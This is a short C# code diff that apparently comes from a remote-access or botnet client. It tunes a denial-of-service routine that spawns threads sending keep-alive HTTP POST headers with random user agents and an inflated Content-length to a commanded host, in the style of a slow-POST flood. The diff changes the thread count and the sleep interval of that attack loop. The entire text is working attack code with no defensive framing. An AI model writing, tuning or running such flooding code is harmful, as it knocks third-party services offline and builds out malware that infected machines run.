@@ -41,7 +41,7 @@ namespace Client.Handle_Packet
                 Debug.WriteLine($"Host:{host} Port:{port} Timeout:{timeout}");
                 while (!Packet.ctsDos.IsCancellationRequested && timespan > stopwatch.Elapsed && ClientSocket.IsConnected)
                 {
-                    for (int i = 0; i < 30; i++)
+                    for (int i = 0; i < 20; i++)
                     {
                         new Thread(() =>
                         {
@@ -52,7 +52,7 @@ namespace Client.Handle_Packet
                                 string post = $"POST / HTTP/1.1\r\nHost: {host} \r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: {userAgents[new Random().Next(userAgents.Length)]}\r\nContent-length: 5235\r\n\r\n";
                                 byte[] buffer = Encoding.UTF8.GetBytes(post);
                                 tcp.Send(buffer, 0, buffer.Length, SocketFlags.None);
-                                Thread.Sleep(4000);
+                                Thread.Sleep(2500);
                                 tcp.Dispose();
                             }
                             catch
